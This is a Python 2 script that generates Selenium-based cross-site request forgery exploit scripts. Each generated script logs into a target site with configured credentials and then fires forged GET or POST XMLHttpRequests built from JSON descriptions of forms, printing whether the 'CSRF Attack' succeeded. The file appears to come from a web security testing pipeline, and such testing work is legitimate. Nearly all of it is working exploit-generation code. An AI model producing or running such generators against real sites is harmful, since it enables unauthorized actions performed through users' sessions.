import os
import json

output_dir = 'out'
if os.path.exists(output_dir):
	for file in os.listdir(output_dir):
		os.remove(output_dir + '/' + file)
		print 'Removed file: ' + output_dir + '/' + file
else:
	os.makedirs(output_dir)


###
# execute javascript code in browser
# @param  {String} js_code_string the javascript code in string format
# @return                         the string need to be written to the file
def execute_script(js_code_string):
	return 'browser.execute_script("""\n' + js_code_string + '\n""")\n'

###
# process the GET request
# @param  {Object} json_data
# @return          the string need to be written to the file
def process_get(json_data):
	result = ''

	action = json_data['action']
	query = []
	for key, value in json_data['parameter'].iteritems():
		query.append(key + '=' + value)

	result += 'var request = new XMLHttpRequest();\n'
	result += 'request.open("GET", "' + action + '?' + '&'.join(query) + '", false);\n'
	result += 'request.send();\n'
	result += 'return request.status;'

	return execute_script(result)

###
# process the POST request
# @param  {Object} json_data
# @return          the string need to be written to the file
def process_post(json_data):
	result = ''

	action = json_data['action']
	query = []
	for key, value in json_data['parameter'].iteritems():
		query.append(key + '=' + value)

	result += 'var request = new XMLHttpRequest();\n'
	result += 'request.open("POST", "' + action + '", false);\n'
	result += 'request.setRequestHeader("Content-type","application/x-www-form-urlencoded");\n'
	result += 'request.send("' + '&'.join(query) + '");\n'
	result += 'return request.status;'

	return execute_script(result)

###
# generate the exploit scripts
# @param  {String}  file_name
# @param  {Object}  json_config
# @param  {Object}  json_data
# @return {Boolean}             wether the generation is successful or not
def generate_exploit_script(file_name, json_config, json_data):
	file = open(output_dir + '/' + file_name, 'w')

	file.write('from selenium import webdriver\n\n')

	file.write('browser = webdriver.Firefox()\n\n')

	# login first
	file.write('browser.get("' + json_config['login_url'] + '")\n')
	file.write('print browser.title\n\n')

	file.write('username = browser.find_element_by_name("username")\n')
	file.write('username.send_keys("' + json_config['username'] + '")\n')
	file.write('password = browser.find_element_by_name("password")\n')
	file.write('password.send_keys("' + json_config['password'] + '")\n')
	file.write('password.submit()\n\n')

	file.write('rc = ')
	# perform attack operation
	if json_data['method'].lower() == 'get':
		# print 'Process GET'
		file.write(process_get(json_data))
	elif json_data['method'].lower() == 'post':
		# print 'Process POST'
		file.write(process_post(json_data))
	else:
		print 'Unknown action: ' + json_data['method']
		file.close()
		os.remove(output_dir + '/' + file_name)
		return False

	file.write('browser.quit()\n')
	file.write("""
if rc == 200:
	print "CSRF Attack success!"
else:
	print "CSRF Attack failed..."
""")

	file.close()

	return True

################################################################################
# end of functions
################################################################################

# read config
config_file_path = '../config.json'
with open(config_file_path) as config_file:
	config = json.load(config_file)


counter = 1
with open('../phase2&3/phase3.json') as data_file:
	data = json.load(data_file)

for obj in data:
	file_name = 'exploit_script_' + `counter` + '.py'
	if generate_exploit_script(file_name, config, obj):
		print 'Generated script: ' + output_dir + '/' + file_name
		counter += 1

